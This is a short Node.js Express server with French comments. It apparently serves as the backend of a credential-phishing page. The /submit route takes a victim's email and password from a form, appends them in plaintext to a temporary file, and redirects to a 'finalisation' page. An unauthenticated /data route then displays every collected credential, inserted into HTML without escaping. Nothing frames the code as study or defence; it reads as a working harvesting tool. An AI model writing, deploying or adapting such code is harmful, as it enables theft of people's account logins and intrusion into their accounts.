const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs/promises');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware pour servir les fichiers statiques du dossier 'public'
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));

// Route pour servir le fichier HTML du formulaire
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Fonction pour sauvegarder les données dans un fichier temporaire
async function saveData(email, password) {
    const tempDir = process.env.VERCEL_TMP || '/tmp';
    const filePath = path.join(tempDir, 'dc.txt');
    const data = `Compte : ${email}\nMot de Passe : ${password}\n\n`;
    try {
        await fs.appendFile(filePath, data);
        console.log('Les informations ont été sauvegardées dans le fichier temporaire !');
    } catch (err) {
        console.error('Erreur lors de la sauvegarde des informations:', err);
        throw new Error('Erreur lors de la sauvegarde des informations');
    }
}

// Route pour la soumission du formulaire
app.post('/submit', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).send('Email et mot de passe sont requis.');
    }

    try {
        await saveData(email, password);
        res.redirect('/finalisation.html');
    } catch (err) {
        console.error('Une erreur est survenue:', err);
        res.status(500).send('Une erreur est survenue lors de la sauvegarde des informations.');
    }
});

// Route pour lire le fichier temporaire
app.get('/data', async (req, res) => {
    const tempDir = process.env.VERCEL_TMP || '/tmp';
    const filePath = path.join(tempDir, 'dc.txt');
    try {
        const data = await fs.readFile(filePath, 'utf8');
        res.send(`<pre>${data}</pre>`);
    } catch (err) {
        console.error('Erreur lors de la lecture du fichier:', err);
        res.status(500).send('Erreur lors de la lecture des données');
    }
});

// Configuration du port et démarrage du serveur
app.listen(PORT, () => {
    console.log(`Serveur en écoute sur le port ${PORT}`);
});
